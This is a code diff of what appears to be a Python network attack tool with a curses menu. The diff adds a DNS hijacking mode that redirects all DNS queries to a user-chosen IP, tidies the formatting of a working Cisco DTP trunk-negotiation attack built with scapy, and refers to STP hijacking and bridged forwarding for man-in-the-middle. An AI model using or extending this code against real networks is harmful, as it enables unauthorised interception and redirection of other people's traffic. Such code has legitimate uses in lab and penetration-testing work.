@@ -5,6 +5,8 @@ import netifaces
 import curses
 import json
 import create_bridge
+import hijack_dns
+import ipaddress
 from types import SimpleNamespace
 from platform import system
 from scapy.all import *
@@ -27,7 +29,8 @@ except FileNotFoundError:
     print("Attack file not found in ./configs")
     sys.exit(1)
 
-choices = [getattr(getattr(attacks, attr), 'start', None) for attr in vars(attacks) if attr != 'quit' and getattr(getattr(attacks, attr), 'enabled', False)] + [getattr(attacks, 'quit')]
+choices = [getattr(getattr(attacks, attr), 'start', None) for attr in vars(attacks) if
+           attr != 'quit' and getattr(getattr(attacks, attr), 'enabled', False)] + [getattr(attacks, 'quit')]
 verbose = config.verbose
 stdscr: Optional[curses.window] = None  # For GUI
 stop_hijack_event = threading.Event()
@@ -70,7 +73,15 @@ def enable_forwarding(bridge_name: str, interfaces: list):
 
 
 def disable_forwarding(bridge_name: str):
-    create_bridge.end(bridge_name, verbose=verbose)
+    create_bridge.stop(bridge_name, verbose=verbose)
+
+
+def enable_dns_hijack(fakeip, interfaces):
+    hijack_dns.start(fakeip, interfaces)
+
+
+def disable_dns_hijack():
+    hijack_dns.stop()
 
 
 def dtp_atk(iface: list, mac_addr=str(RandMAC())):
@@ -78,13 +89,14 @@ def dtp_atk(iface: list, mac_addr=str(RandMAC())):
     # creating a pkt at the data-link layer (ethernet frame) with the Logical-Link control sublayer
     p = Dot3(src=mac_addr, dst="01:00:0c:cc:cc:cc", len=42)
     p /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)
-    p /= SNAP(OUI=0x0c, code=0x2004)  # including the Organisational Unique Identifier of the macaddr (cisco), configured as dtp pkt
+    p /= SNAP(OUI=0x0c,
+              code=0x2004)  # including the Organisational Unique Identifier of the macaddr (cisco), configured as dtp pkt
     p /= DTP(ver=1, tlvlist=[
-            DTPDomain(length=13, type=1, domain=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00'),
-            DTPStatus(status=b'\x03', length=5, type=2),
-            DTPType(length=5, type=3, dtptype=b'\xa5'),
-            DTPNeighbor(type=4, neighbor=mac_addr, len=10)
-        ])
+        DTPDomain(length=13, type=1, domain=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00'),
+        DTPStatus(status=b'\x03', length=5, type=2),
+        DTPType(length=5, type=3, dtptype=b'\xa5'),
+        DTPNeighbor(type=4, neighbor=mac_addr, len=10)
+    ])
     while not stop_dtp_event.is_set():
         for interface in iface:
             sendp(p, iface=interface, verbose=0)
@@ -129,6 +141,39 @@ def select_option(options, title):
     return options[selection]
 
 
+def get_user_input(prompt, type_check: tuple = (int, float, str, bool, complex)):
+    stdscr.clear()
+    display_banner()
+    while True:
+        stdscr.addstr("\n" + prompt)
+        stdscr.refresh()
+        curses.echo()
+        user_input = stdscr.getstr().decode('utf-8')
+
+        for t in type_check:
+            try:
+                # Special handling for bool because bool('False') is True
+                if t is bool:
+                    if user_input.lower() == 'false':
+                        curses.noecho()
+                        return False
+                    elif user_input.lower() == 'true':
+                        curses.noecho()
+                        return True
+                    else:
+                        raise ValueError
+                converted_input = t(user_input)
+            except ValueError:
+                continue
+            else:
+                # Input is of the correct type
+                curses.noecho()
+                return converted_input
+
+        stdscr.addstr("\nInvalid input. Please enter a value of type(s): " + ', '.join(str(t) for t in type_check))
+        stdscr.refresh()
+
+
 def select_interface(n):
     stdscr.addstr(banner)
     interface = select_option(system_interfaces, f'Please choose an interface for interface {n}')
@@ -164,12 +209,16 @@ def gui(stdscr_gui):
         print("You need at least 1 network interface. Exiting...")
         sys.exit(1)
 
+    ip1 = netifaces.ifaddresses(interface1)[netifaces.AF_INET][0]['addr']
+    ip2 = netifaces.ifaddresses(interface2)[netifaces.AF_INET][0][
+        'addr'] if "No interface available" not in interface2 else ""
+
     while True:
-        display = f"Interface 1: {interface1}\nInterface 2: {interface2}\n\nChoose what to do"
+        display = f"Interface 1: {interface1} ({ip1})\nInterface 2: {interface2} ({ip2})\n\nChoose what to do"
         action = select_option(choices, display)
 
         if action == attacks.quit:
-            disable_forwarding("hijack_stp_br")
+            disable_forwarding(attacks.forward.settings.bridge_name)
             return
 
         if action == attacks.hijack.start:
@@ -214,6 +263,17 @@ def gui(stdscr_gui):
             replace_choice(attacks.trunk.stop, attacks.trunk.start)
             stdscr_gui.addstr(f"Trunk disabled. Press any key to return\n")
 
+        elif action == attacks.dns.start:
+            fakeip = get_user_input("\nWhat IP do you want to resolve DNS queries to?\nIP Address: ", (ipaddress.IPv4Address,))
+            enable_dns_hijack(fakeip, selected_interfaces)
+            replace_choice(attacks.dns.start, attacks.dns.stop)
+            stdscr_gui.addstr(f"Enabled DNS hijacking, resolving all DNS queries to {fakeip}. Press any key to return")
+
+        elif action == attacks.dns.stop:
+            disable_dns_hijack()
+            replace_choice(attacks.dns.stop, attacks.dns.start)
+            stdscr_gui.addstr(f"\nDisabled DNS hijacking. Press any key to return")
+
         ##################################################################
         # Add more functions here
         ##################################################################
@@ -244,7 +304,8 @@ def main():
         sys.exit(1)
     elif len(system_interfaces) < 2:
         print("WARNING: Only 1 network interface detected (loopback cannot be used).")
-        if input("Forwarding packets will not be possible. Do you wish to continue? (Y/N): ").lower() not in ["y", "ye", "yes"]:
+        if input("Forwarding packets will not be possible. Do you wish to continue? (Y/N): ").lower() not in ["y", "ye",
+                                                                                                              "yes"]:
             sys.exit(1)
 
 
@@ -253,7 +314,8 @@ def main():
     stdscr.keypad(True)
 
     if not check_terminal_size(75, 24):
-        print("Please make your terminal bigger to run the script.\nAt least 75 characters in length, 25 characters in height.")
+        print(
+            "Please make your terminal bigger to run the script.\nAt least 75 characters in length, 25 characters in height.")
         sys.exit(1)
 
     # Initialise curse GUI
